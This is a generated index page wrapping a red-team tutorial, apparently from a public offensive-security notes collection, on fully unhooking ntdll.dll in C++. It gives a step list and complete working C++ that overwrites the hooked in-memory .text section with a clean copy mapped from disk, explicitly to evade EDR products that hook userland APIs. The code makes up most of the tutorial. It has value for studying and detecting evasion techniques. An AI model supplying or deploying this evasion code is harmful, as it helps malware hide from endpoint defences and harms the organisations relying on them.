---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Full DLL Unhooking with C++

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-defense-evasion-how-to-unhook-a-dll-using-c` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Full DLL Unhooking with C++](../../topics/offensive-security/full-dll-unhooking-with-c.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-defense-evasion-how-to-unhook-a-dll-using-c |
| name | Full DLL Unhooking with C++ |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++.md |

## Preserved Source Material

````yaml
_asset_filenames:
- image (570).png
_body: "---\ndescription: EDR evasion\n---\n\n# Full DLL Unhooking with C++\n\nIt's possible to completely unhook any given\
  \ DLL loaded in memory, by reading the .text section of ntdll.dll from disk and putting it on top of the .text section of\
  \ the ntdll.dll that is mapped in memory. This may help in evading some EDR solutions that rely on userland API hooking.\n\
  \n## Overview\n\nThe process for unhooking a DLL is as follows. Let's assume that the  ntdll.dll is hooked and here is how\
  \ we could unhook it:\n\n1. Map a fresh copy of ntdll.dll from disk to process memory\n2. Find virtual address of the .text\
  \ section of the hooked ntdll.dll\n   1. get ntdll.dll base address\n   2. module base address + module's .text section\
  \ VirtualAddress\n3. Find virtual address of the .text section of the freshly mapped ntdll.dll\n4. Get original memory protections\
  \ of the hooked module's .text section\n5. Copy .text section from the freshly mapped dll to the virtual address (found\
  \ in step 3) of the original (hooked) ntdll.dll - this is the meat of the unhooking as all hooked bytes get overwritten\
  \ with fresh ones from the disk\n6. Apply original memory protections to the freshly unhooked .text section of the original\
  \ ntdll.dll\n\nBelow is a simplified graph, illustrating the core concept of the technique, where a hooked .text section\
  \ of ntdll.dll is replaced with a clean copy of .text section of ntdll.dll from disk:\n\n![](<../../.gitbook/assets/image\
  \ (570).png>)\n\n## Code\n\nBelow code fully unhooks the ntdll.dll, although it could be modified to unhook any other DLL.\n\
  \n```cpp\n#include \"pch.h\"\n#include <iostream>\n#include <Windows.h>\n#include <winternl.h>\n#include <psapi.h>\n\nint\
  \ main()\n{\n\tHANDLE process = GetCurrentProcess();\n\tMODULEINFO mi = {};\n\tHMODULE ntdllModule = GetModuleHandleA(\"\
  ntdll.dll\");\n\t\n\tGetModuleInformation(process, ntdllModule, &mi, sizeof(mi));\n\tLPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;\n\
  \tHANDLE ntdllFile = CreateFileA(\"c:\\\\windows\\\\system32\\\\ntdll.dll\", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING,\
  \ 0, NULL);\n\tHANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);\n\tLPVOID\
  \ ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);\n\n\tPIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;\n\
  \tPIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);\n\n\tfor (WORD\
  \ i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {\n\t\tPIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader)\
  \ + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));\n\t\t\n\t\tif (!strcmp((char*)hookedSectionHeader->Name, (char*)\".text\"\
  )) {\n\t\t\tDWORD oldProtection = 0;\n\t\t\tbool isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress),\
  \ hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);\n\t\t\tmemcpy((LPVOID)((DWORD_PTR)ntdllBase\
  \ + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress),\
  \ hookedSectionHeader->Misc.VirtualSize);\n\t\t\tisProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress),\
  \ hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);\n\t\t}\n\t}\n\t\n\tCloseHandle(process);\n\tCloseHandle(ntdllFile);\n\
  \tCloseHandle(ntdllMapping);\n\tFreeLibrary(ntdllModule);\n\t\n\treturn 0;\n}\n```\n\n{% hint style=\"warning\" %}\nNote\
  \ that the above code does not fix image base relocations. Although ntdll.dll does not have anything to be relocated within\
  \ its .text section, it may be required when dealing with other dlls.\n\nThanks [@mrgretzky](https://twitter.com/mrgretzky)\
  \ for highlighting [this](https://twitter.com/mrgretzky/status/1271348438421159936).\n\nSee my notes about PE image relocations:\
  \ [https://ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations#relocation](https://ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations#relocation)\n\
  {% endhint %}"
_relative_path: offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++.md
````
